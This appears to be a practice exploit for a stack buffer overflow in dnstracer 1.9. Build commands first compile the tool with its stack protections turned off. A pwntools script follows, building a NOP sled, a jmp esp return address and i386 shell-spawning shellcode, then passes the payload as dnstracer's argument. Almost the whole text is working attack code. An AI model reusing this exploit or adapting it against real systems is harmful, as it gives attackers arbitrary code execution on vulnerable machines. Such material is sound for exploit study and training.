'''
$ wget http://www.mavetju.org/download/dnstracer-1.9.tar.gz
$ tar zxvf dnstracer-1.9.tar.gz
$ cd dnstracer-1.9
$ ./confugure
$ make && sudo make install

$vim Makefile
CFLAGS = -g -O2 -m32 -fno-stack-protector -Wl,-zexecstack -D_FORTIFY_SOURCE=0
$make clean
$make
'''

from pwn import *
from subprocess import call

jmp_addr=0x804c74f #jmp esp

shellcode=asm(shellcraft.i386.linux.sh())
payload='\x90'*(1041)
payload+=p32(jmp_addr)
payload+='\x90'*(50-19)
payload+=shellcode

print payload

call(["./dnstracer",payload])
